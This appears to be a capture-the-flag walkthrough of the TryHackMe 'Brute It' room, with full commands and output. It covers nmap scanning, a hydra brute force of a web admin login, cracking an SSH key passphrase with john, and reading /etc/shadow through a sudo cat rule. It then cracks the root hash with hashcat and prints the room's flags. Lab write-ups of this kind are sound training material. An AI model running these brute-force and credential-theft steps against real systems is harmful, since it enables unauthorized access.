| Category          | Details                                        |
|-------------------|------------------------------------------------|
| 📝 **Name**       | [Brute It](https://tryhackme.com/room/bruteit) |  
| 🏷 **Type**       | THM Challenge                                  |
| 🖥 **OS**         | Linux                                          |
| 🎯 **Difficulty** | Easy                                           |
| 📁 **Tags**       | hydra, john, hashcat                           |

## Task 2: Reconnaissance

### How many ports are open?

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-28 08:42 +0100
Nmap scan report for 10.82.149.165
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.92 seconds
```

### What version of SSH is running?
> 22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)

### What version of Apache is running?
> 80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))

### Which Linux distribution is running?
> Ubuntu

### What is the hidden directory?

#### Enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ feroxbuster --url http://$TARGET -w /usr/share/wordlists/dirb/big.txt -x php,html,js,png,jpg,py,txt,log -C 404
<SNIP>
301      GET        9l       28w      314c http://10.82.149.165/admin => http://10.82.149.165/admin/
<SNIP>
```

### Task 3: Getting a shell

### What is the user:password of the admin panel?

#### Discover `admin` username in HTML comment
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ curl http://$TARGET/admin/                        
<SNIP>
    <!-- Hey john, if you do not remember, the username is admin -->
<SNIP>
```

#### Use `hydra` to brute force password for user `admin`
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ hydra -I $TARGET http-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid" -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -w 30 
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-02-01 12:20:26
[DATA] max 10 tasks per 1 server, overall 10 tasks, 14344400 login tries (l:1/p:14344400), ~1434440 tries per task
[DATA] attacking http-post-form://10.81.160.254:80/admin/:user=^USER^&pass=^PASS^:Username or password invalid
[80][http-post-form] host: 10.81.160.254   login: admin   password: xavier
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-02-01 12:20:47
```

### What is John's RSA Private Key passphrase?

#### User discovered `admin:xavier` to exfiltrate RSA private key
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ curl -s -L -c cookies.txt http://$TARGET/admin/ -d 'user=admin&pass=xavier' -o /dev/null && \
curl -s -b cookies.txt http://$TARGET/admin/panel/id_rsa -o john_id_rsa && \
chmod 600 john_id_rsa && \
cat john_id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,E32C44CDC29375458A02E94F94B280EA
<SNIP>>
-----END RSA PRIVATE KEY-----
```

#### Break key encryption using `john`
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ ssh2john john_id_rsa  > john_id_rsa.hash && \
john john_id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockinroll       (john_id_rsa)     
1g 0:00:00:00 DONE (2026-02-01 12:29) 4.347g/s 315686p/s 315686c/s 315686C/s saloni..rock14
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### user.txt

#### Use private key to access target over SSH as user `john`
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ ssh -i john_id_rsa john@$TARGET                                                              
Enter passphrase for key 'john_id_rsa': 
<SNIP>
john@bruteit:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
```

#### Capture user flag
```
john@bruteit:~$ cat user.txt 
THM{a_password_is_not_a_barrier}
```

### Web flag

#### Capture web flag
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ curl -s -L -c cookies.txt http://$TARGET/admin/ -d 'user=admin&pass=xavier' | grep -oP THM{.+}
THM{brut3_f0rce_is_e4sy}
```

## Task 4: Privilege Escalation

### What is the root's password?

#### List allowed `sudo` commands
```
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

#### Use `sudo /bin/cat` to access `root` user password hash
```
john@bruteit:~$ sudo /bin/cat /etc/shadow | grep root | cut -d':' -f2
$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.
```

#### Crack `root` user password hash using `hashcat`
```
┌──(magicrc㉿perun)-[~/attack/THM Brute It]
└─$ hashcat -m 1800 '$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.' /usr/share/wordlists/rockyou.txt --quiet
$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:football
```

### root.txt

#### Capture root flag
```
john@bruteit:~$ sudo /bin/cat /root/root.txt
THM{pr1v1l3g3_3sc4l4t10n}
```
